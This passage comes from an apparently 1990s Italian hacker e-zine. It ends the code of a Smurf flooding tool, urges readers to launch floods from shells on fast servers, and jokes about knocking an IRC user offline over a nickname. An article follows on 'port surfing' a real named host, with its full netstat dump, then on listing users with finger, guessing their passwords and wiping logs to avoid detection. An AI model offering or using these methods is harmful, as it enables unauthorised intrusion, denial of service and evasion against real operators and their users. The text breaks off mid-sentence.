    if (nleft == 1) {
            *(u_char *) (&answer) = *(u_char *) addr;
            sum += answer;
    }
    sum = (sum >> 16) + (sum + 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

--- end ---

Vi ricordo che per linux c'e' (Papa)Smurf, sempre di TFreak e se lo volete
basta che andate su rootshell.com e fate una ricerca.
Ok, ora che avete le idee chiare prendetevi 'na bella shell su un server
che ha una T1 ed usate server di rimbalzo che ha molti pc connessi ad esso.
Esempio: tin.it (ihihihih)
Mi raccomando, siate prudenti e rendetevi conto che in mano avete un'arma
abbastanza potente, percio' prima di attaccare qualcuno fatelo per un
buon motivo.
Esempio:

<T0rment0> Perche' hai scritto il mio nick con la T minuscola?
<xxxxxxxx> Beh, io....
<T0rment0> Ok , l'hai voluto tu!
xxxxxxxx ha quit irc (dead socket)
<T0rment0> Ihihihihihih
T0rmento is know as Fesso
<Fesso> Chi e' che mi ha cambiato il nick?
<Fesso> Ops, dovro' cambiarlo prima o poi sto' script di merda!

Eheh, ihih, ehmehm, cough cough, blaaaaa....
(ndezine: Sto ragazzo ha grossa crisi!)

##############################################################################

       	     	   OoOoOoOoOoOoOoOoOoO
             	   o  Port Surfing   o
             	   OoOoOoOoOoOoOoOoOoO


Questo mio articolo e' uscito gia' su Vana Imago 1 del mio caro amico
Techno[K] che potete trovare all'indirizzo
http://members.xoom.it/TechnoKinght/index.htm,
e l'ho pubblicato qui perche' ritengo che sia un articolo
molto interessante per i newbies.
Molte volte abbiamo pensato di hackerare server, ma per farlo bisogna
prima conoscere quali porte ha attive in modo che possiamo sfruttare
dei bug che ha appunto quella porta sul quel tipo di S.O.
Ad aiutarci nella ricerca delle porte vi e' il Port Surfing

Il Port Surfing prende vantaggio con il TCP/IP. Che, come ben saprete,
e' il protocollo (insieme di regole) usato per la comunicazione dei
computer su internet.
Uno dei principi base dell'Unix e' quello di assegnare una porta
ad ogni servizio. Per esempio abbiamo Sendmail, le news, l'FTP, telnet ecc.

Se tu vuoi visitare un sito, il tuo browser attraverso la porta 80
comunica con il sito da visitare e fa una richiesta. E, dopo,
puoi entrare nel sito senza password(tranne quelli per adulti).

Comunque l'essenza dell'hacking e' fare cose che non sono ovvie.
Il port surfing non e' spiegato sui manuali, e' una tecnica da impararsi
da soli e sperimentare prima sul proprio pc.
Consiste nel collegarsi ad un pc remoto e vedere quali porta ha aperte
e vedere quali sono exploitabili.

Ora, se sei un newbies pigro puoi usare programmi come il Satan
o il Netcat. Questi sono programmi che puoi eseguire da Linux, FreeBSD o
Solaris (tutti i tipi di Unix) dal tuo PC. Essi fanno lo scan automatico
a tutte le porte del tuo pc target.
Ti dicono quali porte sono aperte e i loro rispettivi servizi.
E quando trovano dei demoni attivi sulle porte, vedono se sono exploitabili,
cioe' se esistono dei bug, e te lo comunica

Un demone non e' un diavolo o una porta.
Esso e' un programma che viene eseguito in background
su molte ( non tutti) porte di sistemi Unix.
Se trovi un demone su una porta e' probabile che si puo' hackare.
E quando quei tools, satan o netcat, trovano un demone su una porta ti
comunicano subito in che modo possono essere exploitati.

Ci sono pero' delle reazioni usando questi programmi, per esempio:

1) Tu puoi imparare qualcosa. Ma facendolo manualmente capisci subito
come viene eseguito un demone su quella porta.
Credo che c'e' differenza tra usare un exploit di qualcuno e farselo da solo.

2) Tu puoi impressionare i tuoi amici. Se esegui un tool come Satan
i tuoi amici ti diranno "Cavolo, Posso farlo anch'io!"
Essi faranno subito scomparire il segreto del mondo hacker
Molti exploit sono solo lamer eseguendo programmi presi da una bbs o un ftp
Ma se tu scrivi un comando dopo l'altro, i tuoi amici capiranno subito che
usi il cervello. E puoi aiutarli a giocare con i demoni e far acquisire loro
dimestichezza

3) Molti hacker intelligenti usano il port surfing per scoprire
qualcosa di nuovo. Ce ne sono pochissimi che scoprono nuovi bug.
Il resto si apprestano soltanto ad usare gli exploit di altri.
Ricordate il Port Surfing e' un'arma micidiale, sia per farvi capire il
funzionamento dei demoni, sia per hackare una macchina protetta e
capire che alla fin fine ha qualcosa di insicuro.

Ora vedrete un esempio di port surfing su un sistema.

Prima cosa ho deciso di non perdere piu' tempo e di puntare
sul grosso!

Come faccio a trovare un server di grosse dimensioni? Semplice scegliamo
un dominio abbastanza conosciuto e che abbia una rete di grosse dimensioni.
Il mio esempio e' basato su  nmia.com

Allora, dopo essermi loggato dentro la mia shell do' il comando:

<Urkes> [66] ->whois nmia.com
New Mexico Internet Access (NMIA-DOM)
   2201 Buena Vista SE
   Albuquerque, NM 87106

   Domain Name: NMIA.COM

   Administrative Contact, Technical Contact, Zone Contact:
      Orrell, Stan  (SO11)  SAO@NMIA.COM
      (505) 877-0617

   Record last updated on 11-Mar-94.
   Record created on 11-Mar-94.

   Domain servers in listed order:

   NS.NMIA.COM                  198.59.166.10
   GRANDE.NM.ORG                129.121.1.2

Ora abbiamo scoperto che dietro a nmia.com c'e' grande.nm.org
Ecco come ho fatto:

<Urkes> [67] ->telnet grande.nm.org 15
Trying 129.121.1.2 ...
Connected to grande.nm.org.
Escape character is '^]'.
TGV MultiNet V3.5 Rev B, VAX 4000-400, OpenVMS VAX V6.1

Product              License    Authorization        Expiration Date
----------           -------    -------------        ---------------
MULTINET             Yes        A-137-1641            (none)
NFS-CLIENT           Yes        A-137-113237          (none)


*** Configuration for file "MULTINET:NETWORK_DEVICES.CONFIGURATION" ***

Device                                   Adapter     CSR Address    Flags/Vector

------                                   -------     -----------    ------------

se0      (Shared VMS Ethernet/FDDI)       -NONE-        -NONE-       -NONE-

MultiNet Active Connections, including servers:
Proto Rcv-Q Snd-Q  Local Address (Port)    Foreign Address (Port)  State
----- ----- -----  ------------------      ------------------      -----
TCP       0   822  GRANDE.NM.ORG(NETSTAT)  198.59.115.24(1569)     ESTABLISHED
TCP       0     0  GRANDE.NM.ORG(POP3)     164.64.201.67(1256)     ESTABLISHED
TCP       0     0  GRANDE.NM.ORG(4918)     129.121.254.5(TELNET)   ESTABLISHED
TCP       0     0  GRANDE.NM.ORG(TELNET)   AVATAR.NM.ORG(3141)     ESTABLISHED
TCP       0     0  *(NAMESERVICE)          *(*)                    LISTEN
TCP       0     0  *(TELNET)               *(*)                    LISTEN
TCP       0     0  *(FTP)                  *(*)                    LISTEN
TCP       0     0  *(FINGER)               *(*)                    LISTEN
TCP       0     0  *(NETSTAT)              *(*)                    LISTEN
TCP       0     0  *(SMTP)                 *(*)                    LISTEN
TCP       0     0  *(LOGIN)                *(*)                    LISTEN
TCP       0     0  *(SHELL)                *(*)                    LISTEN
TCP       0     0  *(EXEC)                 *(*)                    LISTEN
TCP       0     0  *(RPC)                  *(*)                    LISTEN
TCP       0     0  *(NETCONTROL)           *(*)                    LISTEN
TCP       0     0  *(SYSTAT)               *(*)                    LISTEN
TCP       0     0  *(CHARGEN)              *(*)                    LISTEN
TCP       0     0  *(DAYTIME)              *(*)                    LISTEN
TCP       0     0  *(TIME)                 *(*)                    LISTEN
TCP       0     0  *(ECHO)                 *(*)                    LISTEN
TCP       0     0  *(DISCARD)              *(*)                    LISTEN
TCP       0     0  *(PRINTER)              *(*)                    LISTEN
TCP       0     0  *(POP2)                 *(*)                    LISTEN
TCP       0     0  *(POP3)                 *(*)                    LISTEN
TCP       0     0  *(KERBEROS_MASTER)      *(*)                    LISTEN
TCP       0     0  *(KLOGIN)               *(*)                    LISTEN
TCP       0     0  *(KSHELL)               *(*)                    LISTEN
TCP       0     0  GRANDE.NM.ORG(4174)     OSO.NM.ORG(X11)         ESTABLISHED
TCP       0     0  GRANDE.NM.ORG(4172)     OSO.NM.ORG(X11)         ESTABLISHED
TCP       0     0  GRANDE.NM.ORG(4171)     OSO.NM.ORG(X11)         ESTABLISHED
TCP       0     0  *(FS)                   *(*)                    LISTEN
UDP       0     0  *(NAMESERVICE)          *(*)
UDP       0     0  127.0.0.1(NAMESERVICE)  *(*)
UDP       0     0  GRANDE.NM.OR(NAMESERV)  *(*)
UDP       0     0  *(TFTP)                 *(*)
UDP       0     0  *(BOOTPS)               *(*)
UDP       0     0  *(KERBEROS)             *(*)
UDP       0     0  127.0.0.1(KERBEROS)     *(*)
UDP       0     0  GRANDE.NM.OR(KERBEROS)  *(*)
UDP       0     0  *(*)                    *(*)
UDP       0     0  *(SNMP)                 *(*)
UDP       0     0  *(RPC)                  *(*)
UDP       0     0  *(DAYTIME)              *(*)
UDP       0     0  *(ECHO)                 *(*)
UDP       0     0  *(DISCARD)              *(*)
UDP       0     0  *(TIME)                 *(*)
UDP       0     0  *(CHARGEN)              *(*)
UDP       0     0  *(TALK)                 *(*)
UDP       0     0  *(NTALK)                *(*)
UDP       0     0  *(1023)                 *(*)
UDP       0     0  *(XDMCP)                *(*)

MultiNet registered RPC programs:
Program     Version   Protocol    Port
-------     -------   --------    ----
PORTMAP       2        TCP        111
PORTMAP       2        UDP        111


MultiNet IP Routing tables:
Destination      Gateway          Flags        Refcnt Use      Interface  MTU
----------       ----------       -----        ------ -----    ---------  ----
198.59.167.1     LAWRII.NM.ORG    Up,Gateway,H 0      2        se0        1500
166.45.0.1       ENSS365.NM.ORG   Up,Gateway,H 0      4162     se0        1500
205.138.138.1    ENSS365.NM.ORG   Up,Gateway,H 0      71       se0        1500
204.127.160.1    ENSS365.NM.ORG   Up,Gateway,H 0      298      se0        1500
127.0.0.1        127.0.0.1        Up,Host      5      1183513  lo0        4136
198.59.167.2     LAWRII.NM.ORG    Up,Gateway,H 0      640      se0        1500
192.132.89.2     ENSS365.NM.ORG   Up,Gateway,H 0      729      se0        1500
207.77.56.2      ENSS365.NM.ORG   Up,Gateway,H 0      5        se0        1500
204.97.213.2     ENSS365.NM.ORG   Up,Gateway,H 0      2641     se0        1500
194.90.74.66     ENSS365.NM.ORG   Up,Gateway,H 0      1        se0        1500
204.252.102.2    ENSS365.NM.ORG   Up,Gateway,H 0      109      se0        1500
205.160.243.2    ENSS365.NM.ORG   Up,Gateway,H 0      78       se0        1500
202.213.4.2      ENSS365.NM.ORG   Up,Gateway,H 0      4        se0        1500
202.216.224.66   ENSS365.NM.ORG   Up,Gateway,H 0      113      se0        1500
192.132.89.3     ENSS365.NM.ORG   Up,Gateway,H 0      1100     se0        1500
198.203.196.67   ENSS365.NM.ORG   Up,Gateway,H 0      385      se0        1500
160.205.13.3     ENSS365.NM.ORG   Up,Gateway,H 0      78       se0        1500
202.247.107.131  ENSS365.NM.ORG   Up,Gateway,H 0      19       se0        1500
198.59.167.4     LAWRII.NM.ORG    Up,Gateway,H 0      82       se0        1500
128.148.157.6    ENSS365.NM.ORG   Up,Gateway,H 0      198      se0        1500
160.45.10.6      ENSS365.NM.ORG   Up,Gateway,H 0      3        se0        1500
128.121.50.7     ENSS365.NM.ORG   Up,Gateway,H 0      3052     se0        1500
206.170.113.8    ENSS365.NM.ORG   Up,Gateway,H 0      1451     se0        1500
128.148.128.9    ENSS365.NM.ORG   Up,Gateway,H 0      1122     se0        1500
203.7.132.9      ENSS365.NM.ORG   Up,Gateway,H 0      14       se0        1500
204.216.57.10    ENSS365.NM.ORG   Up,Gateway,H 0      180      se0        1500
130.74.1.75      ENSS365.NM.ORG   Up,Gateway,H 0      10117    se0        1500
206.68.65.15     ENSS365.NM.ORG   Up,Gateway,H 0      249      se0        1500
129.219.13.81    ENSS365.NM.ORG   Up,Gateway,H 0      547      se0        1500
204.255.246.18   ENSS365.NM.ORG   Up,Gateway,H 0      1125     se0        1500
160.45.24.21     ENSS365.NM.ORG   Up,Gateway,H 0      97       se0        1500
206.28.168.21    ENSS365.NM.ORG   Up,Gateway,H 0      2093     se0        1500
163.179.3.222    ENSS365.NM.ORG   Up,Gateway,H 0      315      se0        1500
198.109.130.33   ENSS365.NM.ORG   Up,Gateway,H 0      1825     se0        1500
199.224.108.33   ENSS365.NM.ORG   Up,Gateway,H 0      11362    se0        1500
203.7.132.98     ENSS365.NM.ORG   Up,Gateway,H 0      73       se0        1500
198.111.253.35   ENSS365.NM.ORG   Up,Gateway,H 0      1134     se0        1500
206.149.24.100   ENSS365.NM.ORG   Up,Gateway,H 0      3397     se0        1500
165.212.105.106  ENSS365.NM.ORG   Up,Gateway,H 0      17       se0        1006
205.238.3.241    ENSS365.NM.ORG   Up,Gateway,H 0      69       se0        1500
198.49.44.242    ENSS365.NM.ORG   Up,Gateway,H 0      25       se0        1500
194.22.188.242   ENSS365.NM.ORG   Up,Gateway,H 0      20       se0        1500
164.64.0         LAWRII.NM.ORG    Up,Gateway   1      40377    se0        1500
0.0.0            ENSS365.NM.ORG   Up,Gateway   2      4728741  se0        1500
207.66.1         GLORY.NM.ORG     Up,Gateway   0      51       se0        1500
205.166.1        GLORY.NM.ORG     Up,Gateway   0      1978     se0        1500
204.134.1        LAWRII.NM.ORG    Up,Gateway   0      54       se0        1500
204.134.2        GLORY.NM.ORG     Up,Gateway   0      138      se0        1500
192.132.2        129.121.248.1    Up,Gateway   0      6345     se0        1500
204.134.67       GLORY.NM.ORG     Up,Gateway   0      2022     se0        1500
206.206.67       GLORY.NM.ORG     Up,Gateway   0      7778     se0        1500
206.206.68       LAWRII.NM.ORG    Up,Gateway   0      3185     se0        1500
207.66.5         GLORY.NM.ORG     Up,Gateway   0      626      se0        1500
204.134.69       GLORY.NM.ORG     Up,Gateway   0      7990     se0        1500
207.66.6         GLORY.NM.ORG     Up,Gateway   0      53       se0        1500
204.134.70       LAWRII.NM.ORG    Up,Gateway   0      18011    se0        1500
192.188.135      GLORY.NM.ORG     Up,Gateway   0      5        se0        1500
206.206.71       LAWRII.NM.ORG    Up,Gateway   0      2        se0        1500
204.134.7        GLORY.NM.ORG     Up,Gateway   0      38       se0        1500
199.89.135       GLORY.NM.ORG     Up,Gateway   0      99       se0        1500
198.59.136       LAWRII.NM.ORG    Up,Gateway   0      1293     se0        1500
204.134.9        GLORY.NM.ORG     Up,Gateway   0      21       se0        1500
204.134.73       GLORY.NM.ORG     Up,Gateway   0      59794    se0        1500
129.138.0        GLORY.NM.ORG     Up,Gateway   0      5262     se0        1500
192.92.10        LAWRII.NM.ORG    Up,Gateway   0      163      se0        1500
206.206.75       LAWRII.NM.ORG    Up,Gateway   0      604      se0        1500
207.66.13        GLORY.NM.ORG     Up,Gateway   0      1184     se0        1500
204.134.77       LAWRII.NM.ORG    Up,Gateway   0      3649     se0        1500
207.66.14        GLORY.NM.ORG     Up,Gateway   0      334      se0        1500
204.134.78       GLORY.NM.ORG     Up,Gateway   0      239      se0        1500
204.52.207       GLORY.NM.ORG     Up,Gateway   0      293      se0        1500
204.134.79       GLORY.NM.ORG     Up,Gateway   0      1294     se0        1500
192.160.144      LAWRII.NM.ORG    Up,Gateway   0      117      se0        1500
206.206.80       PENNY.NM.ORG     Up,Gateway   0      4663     se0        1500
204.134.80       GLORY.NM.ORG     Up,Gateway   0      91       se0        1500
198.99.209       LAWRII.NM.ORG    Up,Gateway   0      1136     se0        1500
207.66.17        GLORY.NM.ORG     Up,Gateway   0      24173    se0        1500
204.134.82       GLORY.NM.ORG     Up,Gateway   0      29766    se0        1500
192.41.211       GLORY.NM.ORG     Up,Gateway   0      155      se0        1500
192.189.147      LAWRII.NM.ORG    Up,Gateway   0      3133     se0        1500
204.134.84       PENNY.NM.ORG     Up,Gateway   0      189      se0        1500
204.134.87       LAWRII.NM.ORG    Up,Gateway   0      94       se0        1500
146.88.0         GLORY.NM.ORG     Up,Gateway   0      140      se0        1500
192.84.24        GLORY.NM.ORG     Up,Gateway   0      3530     se0        1500
204.134.88       LAWRII.NM.ORG    Up,Gateway   0      136      se0        1500
198.49.217       GLORY.NM.ORG     Up,Gateway   0      303      se0        1500
192.132.89       GLORY.NM.ORG     Up,Gateway   0      3513     se0        1500
198.176.219      GLORY.NM.ORG     Up,Gateway   0      1278     se0        1500
206.206.92       LAWRII.NM.ORG    Up,Gateway   0      1228     se0        1500
192.234.220      129.121.1.91     Up,Gateway   0      2337     se0        1500
204.134.92       LAWRII.NM.ORG    Up,Gateway   0      13995    se0        1500
198.59.157       LAWRII.NM.ORG    Up,Gateway   0      508      se0        1500
206.206.93       GLORY.NM.ORG     Up,Gateway   0      635      se0        1500
204.134.93       GLORY.NM.ORG     Up,Gateway   0      907      se0        1500
198.59.158       LAWRII.NM.ORG    Up,Gateway   0      14214    se0        1500
198.59.159       LAWRII.NM.ORG    Up,Gateway   0      1806     se0        1500
204.134.95       PENNY.NM.ORG     Up,Gateway   0      3644     se0        1500
206.206.96       GLORY.NM.ORG     Up,Gateway   0      990      se0        1500
206.206.161      LAWRII.NM.ORG    Up,Gateway   0      528      se0        1500
198.59.97        PENNY.NM.ORG     Up,Gateway   0      55       se0        1500
198.59.161       LAWRII.NM.ORG    Up,Gateway   0      497      se0        1500
192.207.226      GLORY.NM.ORG     Up,Gateway   0      93217    se0        1500
198.59.99        PENNY.NM.ORG     Up,Gateway   0      2        se0        1500
198.59.163       GLORY.NM.ORG     Up,Gateway   0      3379     se0        1500
192.133.100      LAWRII.NM.ORG    Up,Gateway   0      3649     se0        1500
204.134.100      GLORY.NM.ORG     Up,Gateway   0      8        se0        1500
128.165.0        PENNY.NM.ORG     Up,Gateway   0      15851    se0        1500
198.59.165       GLORY.NM.ORG     Up,Gateway   0      274      se0        1500
206.206.165      LAWRII.NM.ORG    Up,Gateway   0      167      se0        1500
206.206.102      GLORY.NM.ORG     Up,Gateway   0      5316     se0        1500
160.230.0        LAWRII.NM.ORG    Up,Gateway   0      19408    se0        1500
206.206.166      LAWRII.NM.ORG    Up,Gateway   0      1756     se0        1500
205.166.231      GLORY.NM.ORG     Up,Gateway   0      324      se0        1500
198.59.167       GLORY.NM.ORG     Up,Gateway   0      1568     se0        1500
206.206.103      GLORY.NM.ORG     Up,Gateway   0      3629     se0        1500
198.59.168       GLORY.NM.ORG     Up,Gateway   0      9063     se0        1500
206.206.104      GLORY.NM.ORG     Up,Gateway   0      7333     se0        1500
206.206.168      GLORY.NM.ORG     Up,Gateway   0      234      se0        1500
204.134.105      LAWRII.NM.ORG    Up,Gateway   0      4826     se0        1500
206.206.105      LAWRII.NM.ORG    Up,Gateway   0      422      se0        1500
204.134.41       LAWRII.NM.ORG    Up,Gateway   0      41782    se0        1500
206.206.169      GLORY.NM.ORG     Up,Gateway   0      5101     se0        1500
204.134.42       GLORY.NM.ORG     Up,Gateway   0      10761    se0        1500
206.206.170      GLORY.NM.ORG     Up,Gateway   0      916      se0        1500
198.49.44        GLORY.NM.ORG     Up,Gateway   0      3        se0        1500
198.59.108       GLORY.NM.ORG     Up,Gateway   0      2129     se0        1500
204.29.236       GLORY.NM.ORG     Up,Gateway   0      125      se0        1500
206.206.172      GLORY.NM.ORG     Up,Gateway   0      5839     se0        1500
204.134.108      GLORY.NM.ORG     Up,Gateway   0      3216     se0        1500
206.206.173      GLORY.NM.ORG     Up,Gateway   0      374      se0        1500
198.175.173      LAWRII.NM.ORG    Up,Gateway   0      6227     se0        1500
198.59.110       GLORY.NM.ORG     Up,Gateway   0      1797     se0        1500
198.51.238       GLORY.NM.ORG     Up,Gateway   0      1356     se0        1500
192.136.110      GLORY.NM.ORG     Up,Gateway   0      583      se0        1500
204.134.48       GLORY.NM.ORG     Up,Gateway   0      42       se0        1500
198.175.176      LAWRII.NM.ORG    Up,Gateway   0      32       se0        1500
206.206.114      LAWRII.NM.ORG    Up,Gateway   0      44       se0        1500
206.206.179      LAWRII.NM.ORG    Up,Gateway   0      14       se0        1500
198.59.179       PENNY.NM.ORG     Up,Gateway   0      222      se0        1500
198.59.115       GLORY.NM.ORG     Up,Gateway   1      132886   se0        1500
206.206.181      GLORY.NM.ORG     Up,Gateway   0      1354     se0        1500
206.206.182      SIENNA.NM.ORG    Up,Gateway   0      16       se0        1500
206.206.118      GLORY.NM.ORG     Up,Gateway   0      3423     se0        1500
206.206.119      GLORY.NM.ORG     Up,Gateway   0      282      se0        1500
206.206.183      SIENNA.NM.ORG    Up,Gateway   0      2473     se0        1500
143.120.0        LAWRII.NM.ORG    Up,Gateway   0      123533   se0        1500
206.206.184      GLORY.NM.ORG     Up,Gateway   0      1114     se0        1500
205.167.120      GLORY.NM.ORG     Up,Gateway   0      4202     se0        1500
206.206.121      GLORY.NM.ORG     Up,Gateway   1      71       se0        1500
129.121.0        GRANDE.NM.ORG    Up           12     21658599 se0        1500
204.134.122      GLORY.NM.ORG     Up,Gateway   0      195      se0        1500
204.134.58       GLORY.NM.ORG     Up,Gateway   0      7707     se0        1500
128.123.0        GLORY.NM.ORG     Up,Gateway   0      34416    se0        1500
204.134.59       GLORY.NM.ORG     Up,Gateway   0      1007     se0        1500
204.134.124      GLORY.NM.ORG     Up,Gateway   0      37160    se0        1500
206.206.124      LAWRII.NM.ORG    Up,Gateway   0      79       se0        1500
206.206.125      PENNY.NM.ORG     Up,Gateway   0      233359   se0        1500
204.134.126      GLORY.NM.ORG     Up,Gateway   0      497      se0        1500
206.206.126      LAWRII.NM.ORG    Up,Gateway   0      13644    se0        1500
204.69.190       GLORY.NM.ORG     Up,Gateway   0      4059     se0        1500
206.206.190      GLORY.NM.ORG     Up,Gateway   0      1630     se0        1500
204.134.127      GLORY.NM.ORG     Up,Gateway   0      45621    se0        1500
206.206.191      GLORY.NM.ORG     Up,Gateway   0      3574     se0        1500

MultiNet IPX Routing tables:
Destination      Gateway          Flags        Refcnt Use      Interface  MTU
----------       ----------       -----        ------ -----    ---------  ----

MultiNet ARP table:
Host Network Address                              Ethernet Address    Arp Flags
--------------------------------------------      ----------------    ---------
GLORY.NM.ORG (IP 129.121.1.4)                     AA:00:04:00:61:D0   Temporary
[UNKNOWN] (IP 129.121.251.1)                      00:C0:05:01:2C:D2   Temporary
NARANJO.NM.ORG (IP 129.121.1.56)                  08:00:87:04:9F:42   Temporary
CHAMA.NM.ORG (IP 129.121.1.8)                     AA:00:04:00:0C:D0   Temporary
[UNKNOWN] (IP 129.121.251.5)                      AA:00:04:00:D2:D0   Temporary
LAWRII.NM.ORG (IP 129.121.254.10)                 AA:00:04:00:5C:D0   Temporary
[UNKNOWN] (IP 129.121.1.91)                       00:C0:05:01:2C:D2   Temporary
BRAVO.NM.ORG (IP 129.121.1.6)                     AA:00:04:00:0B:D0   Temporary
PENNY.NM.ORG (IP 129.121.1.10)                    AA:00:04:00:5F:D0   Temporary
ARRIBA.NM.ORG (IP 129.121.1.14)                   08:00:2B:BC:C1:A7   Temporary
AZUL.NM.ORG (IP 129.121.1.51)                     08:00:87:00:A1:D3   Temporary
ENSS365.NM.ORG (IP 129.121.1.3)                   00:00:0C:51:EF:58   Temporary
AVATAR.NM.ORG (IP 129.121.254.1)                  08:00:5A:1D:52:0D   Temporary
[UNKNOWN] (IP 129.121.253.2)                      08:00:5A:47:4A:1D   Temporary
[UNKNOWN] (IP 129.121.254.5)                      00:C0:7B:5F:5F:80   Temporary
CONCHAS.NM.ORG (IP 129.121.1.11)                  08:00:5A:47:4A:1D   Temporary
[UNKNOWN] (IP 129.121.253.10)                     AA:00:04:00:4B:D0   Temporary


MultiNet Network Interface statistics:
Name  Mtu   Network     Address            Ipkts    Ierrs Opkts    Oerrs Collis
----  ---   -------     --------------     -----    ----- -----    ----- ------
se0   1500  129.121.0   GRANDE.NM.ORG      68422948 0     53492833 1     0
lo0   4136  127.0.0     127.0.0.1          1188191  0     1188191  0     0

MultiNet Protocol statistics:
          65264173 IP packets received
                22 IP packets smaller than minimum size
              6928 IP fragments received
                 4 IP fragments timed out
                34 IP received for unreachable destinations
            704140 ICMP error packets generated
              9667 ICMP opcodes out of range
              4170 Bad ICMP packet checksums
            734363 ICMP responses
            734363 ICMP "Echo" packets received
            734363 ICMP "Echo Reply" packets sent
             18339 ICMP "Echo Reply" packets received
            704140 ICMP "Destination Unreachable" packets sent
            451243 ICMP "Destination Unreachable" packets received
              1488 ICMP "Source Quench" packets received
            163911 ICMP "ReDirect" packets received
            189732 ICMP "Time Exceeded" packets received
            126966 TCP connections initiated
            233998 TCP connections established
            132611 TCP connections accepted
             67972 TCP connections dropped
             28182 embryonic TCP connections dropped
            269399 TCP connections closed
          10711838 TCP segments timed for RTT
          10505140 TCP segments updated RTT
           3927264 TCP delayed ACKs sent
               666 TCP connections dropped due to retransmit timeouts
            111040 TCP retransmit timeouts
              3136 TCP persist timeouts
                 9 TCP persist connection drops
             16850 TCP keepalive timeouts
              1195 TCP keepalive probes sent
             14392 TCP connections dropped due to keepalive timeouts
          28842663 TCP packets sent
          12714484 TCP data packets sent
        1206060086 TCP data bytes sent
             58321 TCP data packets retransmitted
          22144036 TCP data bytes retransmitted
           6802199 TCP ACK-only packets sent
              1502 TCP window probes sent
               483 TCP URG-only packets sent
           8906175 TCP Window-Update-only packets sent
            359509 TCP control packets sent
          38675084 TCP packets received
          28399363 TCP packets received in sequence
        1929418386 TCP bytes received in sequence
             25207 TCP packets with checksum errors
            273374 TCP packets were duplicates
         230525708 TCP bytes were duplicates
              3748 TCP packets had some duplicate bytes
            493214 TCP bytes were partial duplicates
           2317156 TCP packets were out of order
        3151204672 TCP bytes were out of order
              1915 TCP packets had data after window
            865443 TCP bytes were after window
              5804 TCP packets for already closed connection
               941 TCP packets were window probes
          10847459 TCP packets had ACKs
            222657 TCP packets had duplicate ACKs
                 1 TCP packet ACKed unsent data
        1200274739 TCP bytes ACKed
            141545 TCP packets had window updates
                13 TCP segments dropped due to PAWS
           4658158 TCP segments were predicted pure-ACKs
          24033756 TCP segments were predicted pure-data
           8087980 TCP PCB cache misses
               305 Bad UDP header checksums
                17 Bad UDP data length fields
          23772272 UDP PCB cache misses

MultiNet Buffer Statistics:
        388 out of 608 buffers in use:
                30 buffers allocated to Data.
                10 buffers allocated to Packet Headers.
                66 buffers allocated to Socket Structures.
                57 buffers allocated to Protocol Control Blocks.
                163 buffers allocated to Routing Table Entries.
                2 buffers allocated to Socket Names and Addresses.
                48 buffers allocated to Kernel Fork-Processes.
                2 buffers allocated to Interface Addresses.
                1 buffer allocated to Multicast Addresses.
                1 buffer allocated to Timeout Callbacks.
                6 buffers allocated to Memory Management.
                2 buffers allocated to Network TTY Control Blocks.
        11 out of 43 page clusters in use.
        11 CXBs borrowed from VMS device drivers
        2 CXBs waiting to return to the VMS device drivers
        162 Kbytes allocated to MultiNet buffers (44% in use).
        226 Kbytes of allocated buffer address space (0% of maximum).
Connection closed by foreign host.
<Urkes> [68] ->

Uao! Cos'e' questo?

Questo l'abbiamo visto telnettando alla porta 15
--la porta netstat (network statistics)--
cioe' su molti computer sono eseguiti dei demoni che dicono
ad ognuno chi si cura di dare informazioni riguardo a quei server che
usano lui per collegarsi ad internet.

In questo modo abbiamo imparato due cose:

1) Grande.nm.org e' un computer importante molto affollato.

2) Per ogni grande ed occupato computer puo' andare bene un port surfing
   con porte casuali

Ora provo la porta 79. Do' il comando:

<Urkes> [68] ->telnet grande.nm.org 79
Trying 129.121.1.2 ...
Connected to grande.nm.org.
Escape character is '^]'.
finger
?Sorry, could not find "FINGER"
Connection closed by foreign host.
<Urkes> [69] ->telnet grande.nm.org 79
Trying 129.121.1.2 ...
Connected to grande.nm.org.
Escape character is '^]'.
help
?Sorry, could not find "HELP"
Connection closed by foreign host.
<Urkes> [69] ->telnet grande.nm.org 79
Trying 129.121.1.2 ...
Connected to grande.nm.org.
Escape character is '^]'.
?
?Sorry, could not find "?"
Connection closed by foreign host.
<Urkes> [69] ->telnet grande.nm.org 79
Trying 129.121.1.2 ...
Connected to grande.nm.org.
Escape character is '^]'.
man
?Sorry, could not find "MAN"
Connection closed by foreign host.
<Urkes> [69] ->

Al primo impatto possono sembrare un insieme di comandi perduti.
Ma attualmente questo e' molto affascinante.
La reazione e' che la porta 79 e' , sotto regole IETF,
suppondendo che fingerd sia eseguito, il demone finger.
Quando do' il comando "finger", grande.nm.org risponde
?Sorry, could not find "FINGER," immagino che il demone
non sia sottoposto alle regole IETF.

Facciamo un accorgimento:
il demone finger non e' presente su tutti i computer. Questo perche'
il finger ha proprieta' che possono essre usate per avere il controllo
totale del computer che lo esegue.

Se il finger e' spento, e nient'altro e' eseguito sulla porta 79,
avremo la risposta:

	telnet: connect: Connection refused.

Se invece ci permette di connetterci alla porta 79 ma non appare niente,
significa che aspetta che noi digitiamo qualcosa.

 "Help," "?" and "man"


Ora, quando avremo a che fare con una porta la quale non conosciamo i comandi,
potremo usare i comandi "Help" , "?" e "man"

Ma attraverso questi comandi non e' che verremo aiutati, ma ci diranno
a cosa il demone e' particolarmente sensitivo.

Il finger e' un demone molto importante perche' tiene informazioni riguardo
a tutti gli utenti presenti su quella macchina. Se noi usiamo il comando

finger @nomemacchina.com

Ci da' la lista di tutte gli utenti presenti in quella macchina.
Dopo, una volta che ci siamo segnato il tutto, telnettiamo alla
macchina alla porta 23 e proviamo una combinazione di questo tipo:

login:    nome login che ci siamo segnati prima

password: provate il suo nome, cognome, e altre cose
          che avete visto con il finger


E dopo, cosa faremo? Se acquisiamo accesso su un sistema, la prima cosa
da fare e' cancellare i log, cioe' non lasciare tracce che possano
insospettire l'admin.

Il log della shell registra su un file tutte le operazioni e i comandi
eseguiti su quel pc.
L'ammistratore di computer importante come grande.nm.org
sara' probabilmente competente  e guardera' sicuramente i log
di quali comandi sono stati eseguiti. Specialmente su una porta importante
e cosi misteriosa, il demone non-IETF . Anche ogni cosa che noi scriviamo
mentre siamo connessi e' stata loggata.

Allora, fai port surfing!  Ecco i principi base:

1) Fallo da una shell. Questa puo' essere sia del tuo provider o del tuo
linux o unix

2) Usa il comando "telnet <hostname> <porta>" dove <hostname> e'
l'indirizzo del pc che vuoi visitare e <porta> e'
il servizio alla quale vuoi collegarti

3) Se appare scritto "connected" il surfing ha funzionato

Mi raccomando a quello che fai. Se fai lo scanning di molte porte sullo
stesso sistema, il sysadmin target potrebbe avvertire il tuo sysadmin ,
